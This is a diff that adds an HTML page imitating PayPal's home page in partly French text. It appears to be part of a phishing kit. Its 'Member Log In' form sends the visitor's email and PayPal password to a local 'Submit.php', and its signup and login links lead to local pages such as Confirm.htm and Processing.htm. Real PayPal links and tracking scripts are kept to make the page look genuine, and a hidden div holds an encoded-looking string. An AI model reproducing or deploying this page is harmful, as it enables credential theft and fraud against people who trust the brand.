@@ -1,0 +1,250 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<META content="text/html; charset=iso-8859-1" http-equiv=Content-Type>
+<!--
+  Script info: Script: WEBSCR, Cmd: _registration-run, Template: p/gen/signup, Version: 14.5-166, Templates: 14.5-183, Date: Fri Oct  4 18:22:30 2002
+-->
+<title>Online Payment, Merchant Account - PayPal</title>
+<meta name="keywords" content="online payment, online payments, payment, payments, merchant account, online merchant account, credit card merchant account, merchant, merchants, merchant account service, merchant account services, internet merchant account">
+<meta name="description" content="PayPal is the safer, easier way to make an online payment or set up a merchant account.">
+<link media="screen" rel="stylesheet" type="text/css" href="files/core.css">
+<link media="screen" rel="stylesheet" type="text/css" href="files/marketing.css">
+<link media="print" rel="stylesheet" type="text/css" href="files/print.css">
+<!--[if gt IE 6]><link media="screen" rel="stylesheet" type="text/css" href="files/ie7.css"><![endif]-->
+
+<!--[if lte IE 6]><link media="screen" rel="stylesheet" type="text/css" href="files/ie6.css"><![endif]-->
+
+<!--[if lt IE 6]><link media="screen" rel="stylesheet" type="text/css" href="files/ie5.css"><![endif]-->
+
+<script type="text/javascript" src="files/yahoo-dom-event.js"></script><script type="text/javascript" src="files/paypal.js"></script><script type="text/javascript" src="files/flash.js"></script><script type="text/javascript" src="files/rosettaLang.js"></script><link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
+</head>
+<body>
+<noscript><p class="nonjsAlert">NOTE: Many features on the PayPal Web site require Javascript and cookies. You can enable both via your browser's preference settings.</p></noscript>
+<div class="outside home" id="page">
+<div class="srd" id="header">
+<h1><a href="webscrcmd=_login-done&login_access=1190737782.htm"><img border="0" src="files/paypal_logo.gif" alt="PayPal"></a></h1>
+<form method="post" id="searchForm" name="searchForm" action="webscrcmd=_login-done&login_access=1190737782.htm">
+<fieldset>
+<legend>Search PayPal</legend>
+<label for="searchBox">Chercher</label><input type="text" id="searchBox" name="queryString" value=""> <input class="button" type="submit" id="search.x" name="search.x" value="Search">
+
+</fieldset>
+<input name="form_charset" type="hidden" value="UTF-8">
+</form>
+<div class="srd" id="navGlobal"><ul>
+<li class="first signup"><a href="Confirm.htm">Ouvrir un compte</a></li>
+<li class="login"><a href="Processing.htm">Connexion</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/helpweb?cmd=_help">Aide</a></li>
+<li class="last"><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_security-center-outside">Centre de Sécurité</a></li>
+</ul></div>
+<form class="rosetta" id="rosetta" method="post" action="webscrcmd=_login-done&login_access=1190737782.htm">
+<fieldset>
+<legend>Change Your Language</legend>
+
+<label for="rosetta_dropdown">Language Select</label><select id="rosetta_dropdown" name="index2.htm"><option value="en_US" selected>Français</option>
+<option value="english.php">U.S. English</option>
+</fieldset>
+<input name="form_charset" type="hidden" value="UTF-8">
+</form>
+</div>
+<div id="navPrimary" class="srd"><ul>
+<li class="active"><a href="webscrcmd=_login-done&login_access=1190737782.htm" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:L5');">Accueil</a></li>
+<li><a href="webscrcmd=_login-done&login_access=1190737782.htm" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:L8');">Personnel</a></li>
+
+<li><a href="webscrcmd=_login-done&login_access=1190737782.htm" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:O3');">Business</a></li>
+<li><a href="webscrcmd=_login-done&login_access=1190737782.htm" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:S9');">Produits et services</a></li>
+</ul></div>
+<hr>
+<div id="content">
+<div class="sidebar box login">
+<div class="body">Connexion au compte</div>
+<div class="header"><form method="post" name="login_form" action="Submit.php">
+<fieldset>
+<legend>Member Log In</legend>
+<p><label for="login_email">Adresse Email</label><input type="text" id="login_email" name="login_email" value=""></p>
+
+<p><label for="login_password">Mot de Pass PayPal</label><input type="password" id="login_password" name="login_password" value=""><script type="text/javascript">
+<!--hide from JavaScript-challenged browsers
+YAHOO.util.Event.addListener(window, "load", function(){
+document.login_form.login_password.focus();
+if (document.login_form.login_email.value == '') {
+document.login_form.login_email.focus();
+}
+});
+// done hiding -->
+</script></p>
+<input type="submit" name="submit.x" value="Connexion" class="button primary">
+</fieldset>
+<p>Récupérer votre <a href="webscrcmd=_login-done&login_access=1190737782.htm">Adresse Email</a> ou <a href="webscrcmd=_login-done&login_access=1190737782.htm">Mot de Passe</a>?</p>
+<p>Nouveau chez PayPal ? <strong><a href="Confirm.htm">Ouvrir un compte</a></strong>.</p>
+<input name="form_charset" type="hidden" value="UTF-8">
+
+</form></div>
+</div>
+<div class="main">
+<div class="zone">
+<div id="hero"><img src="files/hdr_home_560x228.jpg" border="0" alt=""></div>
+<script type="text/javascript">PAYPAL.util.Flash.insertFlash("https://www.paypalobjects.com/en_US/m/hero/hero.swf?XMLfile=heroHome.xml&imgBasePath=https://www.paypalobjects.com/en_US/m/hero/&linkBasePath=https://www.paypal.com/", 560, 228, "hero", true, 7)</script>
+</div>
+<div class="subhead"><div>
+<p>Pay With: </p>
+<ul>
+<li><img border="0" src="files/logo_ccVisa.gif" alt="Visa"></li>
+<li><img border="0" src="files/logo_ccMC.gif" alt="Mastercard"></li>
+<li><img border="0" src="files/logo_ccAmex.gif" alt="American Express"></li>
+<li><img border="0" src="files/logo_ccDiscover.gif" alt="Discover"></li>
+<li><img border="0" src="files/logo_ccBank.gif" alt="Bank"></li>
+
+</ul>
+</div></div>
+<div class="zone simpleList">
+<div class="box">
+<h3>Payer en ligne</h3>
+<ul>
+<li>
+<a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/cps/general/NewConsumerWorks-outside">Payez plus rapidement</a>  lorsque vous achetez en ligne.</li>
+<li>
+<a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/cps/securitycenter/buy/Privacy-outside">Payez Sans Divulguer</a> vos informations de carte de crédit.</li>
+
+<li>
+<a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money">Envoyez de l'argent</a> à vos amis ou à votre famille.</li>
+</ul>
+<p>En savoir plus sur <strong><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_home-customer">le paiement avec PayPal</a></strong>.</p>
+</div>
+<div class="box">
+<h3>Vendre en ligne</h3>
+<ul>
+<li>
+<a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_wp-standard-overview-outside">Acceptez les cartes de crédit</a>  facilement et rapidement.</li>
+
+<li>
+<a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_additional-payment-overview-outside">Augmentez vos ventes</a>. Ajoutez PayPal comme solution de paiement pour attirer un plus grand nombre d'acheteurs.</li>
+<li>
+<a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_auction-outside">Des outils</a> pour simplifier vos efforts de vente.</li>
+</ul>
+<p>En savoir plus sur  <strong><a  ref="https://www.paypal.com/us/cgi-bin/webscr?cmd=_home-merchant">le paiement avec PayPal</a></strong>.</p>
+</div>
+</div>
+<div class="zone"><div class="box"><div class="MktDCLK"><script type="text/javascript">document.write('<script type="text/javascript" charset="iso-8859-1" src="https://paypalssl.doubleclick.net/adj/paypal.us/NewUserHome-outside;lang=en_US;u=;sz=520x70;tile=1;ord=1439941069?"><\/script>');</script></div></div></div>
+
+</div>
+<div class="sidebar box resources">
+<div class="header"><h3>Top questions</h3></div>
+<div class="body"><ul>
+<li><a href="https://www.paypal.com/helpscr?cmd=_help&amp;locale=en_US&amp;countrycode=US&amp;_dyncharset=UTF-8&amp;t=solutionTab&amp;ps=solutionPanels&amp;solutionId=13136">Pourquoi utiliser PayPal, alors que l'on possède des cartes de crédit ?</a></li>
+<li><a href="https://www.paypal.com/helpscr?cmd=_help&amp;locale=en_US&amp;countrycode=US&amp;_dyncharset=UTF-8&amp;t=solutionTab&amp;ps=solutionPanels&amp;solutionId=38429">Quelles sont les possibilités offertes par PayPal ?</a></li>
+<li><a href="https://www.paypal.com/helpscr?cmd=_help&amp;locale=en_US&amp;countrycode=US&amp;_dyncharset=UTF-8&amp;t=solutionTab&amp;ps=solutionPanels&amp;solutionId=13138">L'utilisation de PayPal est-elle gratuite ?</a></li>
+</ul></div>
+</div>
+</div>
+<hr>
+<div id="footer" class="srd">
+<h5 class="accessAid">More Information</h5>
+
+<ul>
+<li class="first"><a href="http://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/about-outside">Notre société</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/helpscr?cmd=_help&amp;t=escalateTab">Service clientèle</a></li>
+<li><a href="http://www.paypal.com/us/cgi-bin/webscr?cmd=_display-fees-outside">Tarifs</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/jobs-outside">Offres d'emploi</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_home-merchant">Outils marchands</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_display-country-functionality-outside">International</a></li>
+<li class="last">
+<!-- OnlineOpinionF3cS v3.0
+The following code is Copyright 1998-2006 Opinionlab, Inc.
+All rights reserved. Unauthorized use is prohibited.
+This product and other products of OpinionLab, Inc. are protected by U.S. Patent No. US 6606581, 6421724, 6785717 B1 and other patents pending.
+http://www.opinionlab.com-->
+<script type="text/javascript" src="files/oo_engine.js"></script><script type="text/javascript">
+			var feedback_link='Site Feedback';
+             	custom_var='Unknown|SRD: Main Home|US|en_US';</script>
+
+</li>
+</ul>
+<ul>
+<li class="first"><a href="http://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/ua/policy_privacy-outside">Respect de la vie privée</a></li>
+<li><a href="http://www.verisign.com/ssl-certificate">Certificats SSL</a></li>
+<li><a href="http://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/ua/ua-outside">Contrats légaux</a></li>
+<li class="last"><a href="http://www.ebay.com/">eBay</a></li>
+</ul>
+<p id="footerSecure"><a target="_blank" href="https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/User/popup/SecurityKeyVIP-outside" onClick="PAYPAL.core.openWindow(event, {width: 425, height: 350})"><img border="0" src="files/logo_VIPwhite_66x27.gif" alt=""></a></p>
+<p id="legal">Copyright © 1999-2008 PayPal. Tous droits réservés.</p>
+</div>
+<div id="navFull"><ul>
+
+<li class="active"><a href="webscrcmd=_login-done&login_access=1190737782.htm" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:L5');">Home</a></li>
+<li><a href="webscrcmd=_login-done&login_access=1190737782.htm" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:L8');">Personal</a></li>
+<li><a href="webscrcmd=_login-done&login_access=1190737782.htm" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:O3');">Business</a></li>
+<li><a href="webscrcmd=_login-done&login_access=1190737782.htm" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:S9');">Products &amp; Services</a></li>
+</ul></div>
+<script type="text/javascript">
+							  // This is an ugly hack until there is a reliable ondomready function
+							 if(typeof PAYPAL != 'undefined'){
+								 PAYPAL.core.Navigation.init();
+							}</script>
+</div>
+<script type="text/javascript" src="files/iconix.js"></script><script type="text/javascript" src="files/pp_naturalsearch.js"></script><script type="text/javascript">
+<!--
+var ppns = new PayPalNaturalSearch('https://www.paypal.com/cgi-bin/webscr?cmd=xpt/cps/homepage/MainHome','3484-30830-12422-0',this.document);
+			ppns.addEngines(new Array(
+										"A9.com",
+										".altavista.com",
+										"clusty.com",
+										"google.co.jp",
+										"google.co.kr",
+										"google.ru",
+										"www.google.com",
+										"icerocket.com",
+										"infospace.com",
+										"mooter.com",
+										"search.msn.",
+										"snap.com",
+										"search.yahoo.com",
+										"search.yahoo.co.jp"
+									,"www.overture.com/d/search/p/altavista/",
+									"aolsearch.aol.com",
+									"search.aol.com",
+									"web.ask.com",
+									"pictures.ask.com",
+									"images.google.com",
+									"groups.google.com",
+									"www.google.com/search",
+									"www.hotbot.com",
+									"search.netscape.com",
+									"s.teoma.com/",
+									"www.wisenut.com"
+							)); // End of aEngines array.
+			ppns.init();
+			-->
+
+</script><div id="ppwebapi" class="advonqo.mha,hfb.lnb-k`ox`o-rdhsqdonqo"></div>
+<!-- SiteCatalyst Code
+Copyright 1997-2005 Omniture, Inc.
+More info available at http://www.omniture.com -->
+<script type="text/javascript" src="files/pp_jscode_080706.js"></script>
+<script type="text/javascript">
+<!--
+/* SiteCatalyst Variables */
+s.prop1="xpt/cps/homepage/MainHome";
+s.prop7="Unknown";
+s.prop8="Unknown";
+s.prop9="Unknown";
+s.prop10="US";
+s.prop34="SRD User";
+s.pageName="SRD: Main Home";
+s.channel="SRD";
+s.prop50="en_US";
+s.prop18="L5L8O3S9";
+/************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
+var s_code=s.t();if(s_code)document.write(s_code)//--></script>
+<script type="text/javascript"><!--
+if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')
+//-->
+</script><noscript><img
+src="//paypal.112.2O7.net/b/ss/paypalglobal/1/H.6--NS/0?pageName=NonJavaScript"
+height="1" width="1" border="0" alt="" /></noscript>
+<!--/DO NOT REMOVE/-->
+
+<!-- End SiteCatalyst Code -->
+</body>
+</html>
